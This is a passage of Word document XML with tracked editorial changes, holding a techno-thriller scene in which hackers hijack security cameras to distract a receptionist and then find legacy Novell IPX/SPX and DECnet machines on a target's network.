            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="723" w:author="TextVet" w:date="2016-03-16T14:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00511028">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> i</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">s right, Danny. </w:t>
      </w:r>
      <w:ins w:id="724" w:author="TextVet" w:date="2016-03-16T14:26:00Z">
        <w:r w:rsidR="006A7F34">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>From</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="725" w:author="TextVet" w:date="2016-03-16T14:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A7F34">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>According to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> my scan, it doesn’t look like there’s that many Windows boxes on the network. Most of their machines look like highly customized Linux distros. The receptionist’s desktop </w:t>
      </w:r>
      <w:del w:id="726" w:author="TextVet" w:date="2016-03-16T14:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001A7D4B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">machine </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>might be the most logical place to start. Which means…”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reluctantly nodded. “Which means we have to find some way to make her go away.” He rubbed his chin</w:t>
      </w:r>
      <w:del w:id="727" w:author="TextVet" w:date="2016-03-16T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A62C57">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> and pondered</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. Gingerly, he pressed the lobby camera’s PTZ buttons. The image panned upward and sideways. Through the glass wall of the Tungsten lobby, embedded in the ceiling of the building’s main corridor, </w:t>
      </w:r>
      <w:del w:id="728" w:author="TextVet" w:date="2016-03-16T14:27:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0000053B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>another camera dome</w:t>
      </w:r>
      <w:ins w:id="729" w:author="TextVet" w:date="2016-03-16T14:28:00Z">
        <w:r w:rsidR="0000053B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:commentRangeStart w:id="730"/>
        <w:r w:rsidR="0000053B">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>sentineled</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:commentRangeEnd w:id="730"/>
      <w:r w:rsidR="0000053B">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="730"/>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see that hallway cam right there?” Danny asked. “Go like this with it…” Danny started pressing buttons at random, making the lobby image dance wildly back and forth. “Keep this up for as long as it takes. Come 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followed suit with the hallway camera. “I’m dizzy, dude. What’s the point of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 know she can see the cameras spin,” Danny said, still fiddling with the buttons. “We just… Need to get… Her attention…”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Suddenly, his entire image jostled.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“Done!” Danny announced. The view came to rest on the receptionist’s face, inches from the lens. His eyes traced the curve of her cheeks, the contours of her lips. He watched as she climbed down from her chair, walked through the lobby doors, and approached the camera that Moshen was driving.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“Ohhhh!” Moshen said. He brought up several more camera feeds, and began tapping their PTZ controls.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got it, Moshen,” said Danny. “Send her on a goose chase all over the building. Just keep her out of that lobby and away from her computer.” With the receptionist occupied, he turned to Mike. “Her computer’s exposed, Mike. Ready to launch Metasploit?”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidRDefault="00FA2256" w:rsidP="000D3488">
      <w:pPr>
        <w:spacing w:after="0" w:line="420" w:lineRule="atLeast"/>
        <w:ind w:firstLine="600"/>
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="731" w:author="TextVet" w:date="2016-03-16T14:32:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">Flummoxed, </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Mike stared </w:t>
      </w:r>
      <w:ins w:id="732" w:author="TextVet" w:date="2016-03-16T14:33:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>into</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="733" w:author="TextVet" w:date="2016-03-16T14:33:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00FA2256">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>at</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his screen</w:t>
      </w:r>
      <w:del w:id="734" w:author="TextVet" w:date="2016-03-16T14:32:00Z">
        <w:r w:rsidR="000D3488" w:rsidRPr="000D3488" w:rsidDel="00FA2256">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> in confusion</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Not yet, Danny. I’m seeing something</w:t>
      </w:r>
      <w:ins w:id="735" w:author="TextVet" w:date="2016-03-16T14:33:00Z">
        <w:r w:rsidR="00690107">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="000D3488" w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> weird…”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“Weird </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="736" w:author="TextVet" w:date="2016-03-16T14:33:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>how?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” Danny a</w:t>
      </w:r>
      <w:ins w:id="737" w:author="TextVet" w:date="2016-03-16T14:33:00Z">
        <w:r w:rsidR="00690107">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>lmost snapped</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="738" w:author="TextVet" w:date="2016-03-16T14:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00690107">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>sked</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it’s really messed up. See… Some of those machines in there… I don’t… I’m not sure I’m reading this right… They’re on the Ethernet segment, but… they’re not using IP.”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“Heh. Don’t be ridiculous. Everything uses IP.” He noticed a quizzical expression from Jason. “IP is the digital language of the Internet. Has been for twenty years. Mike, if they’re not using IP, how are they talking to one another?”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I think they’re… Novell Netware, Danny. Raw IPX/SPX on the 802.3 frame.”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ins w:id="739" w:author="TextVet" w:date="2016-03-16T14:35:00Z">
        <w:r w:rsidR="00CD686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>S</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="740" w:author="TextVet" w:date="2016-03-16T14:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00CD686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Are you s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>erious</w:t>
      </w:r>
      <w:ins w:id="741" w:author="TextVet" w:date="2016-03-16T14:35:00Z">
        <w:r w:rsidR="00CD686C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ly</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>?” Danny asked. “Novell hasn’t used that protocol since the mid</w:t>
      </w:r>
      <w:ins w:id="742" w:author="TextVet" w:date="2016-03-16T14:36:00Z">
        <w:r w:rsidR="008E51CA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="743" w:author="TextVet" w:date="2016-03-16T14:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008E51CA">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nineties. Not since I was in college.”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744" w:author="TextVet" w:date="2016-03-16T14:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0015288E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">Mike said. </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>“Yeah! And there’s something called DECnet Routing Protocol.</w:t>
      </w:r>
      <w:ins w:id="745" w:author="TextVet" w:date="2016-03-16T14:36:00Z">
        <w:r w:rsidR="0015288E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>” Mike’</w:t>
        </w:r>
        <w:r w:rsidR="00E3794C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">s words fell </w:t>
        </w:r>
        <w:r w:rsidR="0015288E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">like broken teeth. </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="746" w:author="TextVet" w:date="2016-03-16T14:37:00Z">
        <w:r w:rsidR="0015288E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>“</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="747" w:author="TextVet" w:date="2016-03-16T14:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0015288E">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Danny, what </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>is</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>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shook his head. “It’s ancient…”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On his laptop, he found a camera that Moshen wasn’t spinning at the moment. He brought up a video feed in a room with large steel refrigerators along the walls. A clunky console sat </w:t>
      </w:r>
      <w:ins w:id="748" w:author="TextVet" w:date="2016-03-16T14:39:00Z">
        <w:r w:rsidR="00C106BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>by</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="749" w:author="TextVet" w:date="2016-03-16T14:39:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C106BA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>next to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> it, beige with black trim. A small CRT monitor was built into its </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>body, showing a screen of blocky green text. The keyboard was two inches thick and looked heavy enough to use as a bludgeoning weapon.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recognized it. It was a relic. An honest-to-God DEC VT100 terminal. Digital Equipment Corporation discontinued those machines when Danny was in junior high — and a few years later, in 1998, after forty years as a multi-billion-dollar industry leader, DEC shuttered its doors. There was a time when those VT100s were as common as telephones. Yet Danny realized that, today, even the most computer-savvy twentysomethings had never even heard of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switched to a camera in the cramped warehouse-like storeroom. In the </w:t>
      </w:r>
      <w:del w:id="750" w:author="TextVet" w:date="2016-03-16T14:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">light of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>weak</w:t>
      </w:r>
      <w:ins w:id="751" w:author="TextVet" w:date="2016-03-16T14:40:00Z">
        <w:r w:rsidR="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>, wan</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="752" w:author="TextVet" w:date="2016-03-16T14:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">yellow </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>lamp</w:t>
      </w:r>
      <w:ins w:id="753" w:author="TextVet" w:date="2016-03-16T14:40:00Z">
        <w:r w:rsidR="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>light</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="754" w:author="TextVet" w:date="2016-03-16T14:40:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>s</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Danny </w:t>
      </w:r>
      <w:ins w:id="755" w:author="TextVet" w:date="2016-03-16T14:41:00Z">
        <w:r w:rsidR="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>descried</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="756" w:author="TextVet" w:date="2016-03-16T14:41:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D8459E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>could make out</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> computers scattered among the rest of the unused equipment. There was the curvy purple case of an SGI O2+ workstation</w:t>
      </w:r>
      <w:del w:id="757" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="758" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…and</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="759" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> There was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a black NeXT cube. There was equipment by Solaris</w:t>
      </w:r>
      <w:del w:id="760" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="761" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidR="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>…</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="762" w:author="TextVet" w:date="2016-03-16T14:42:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008C2464">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
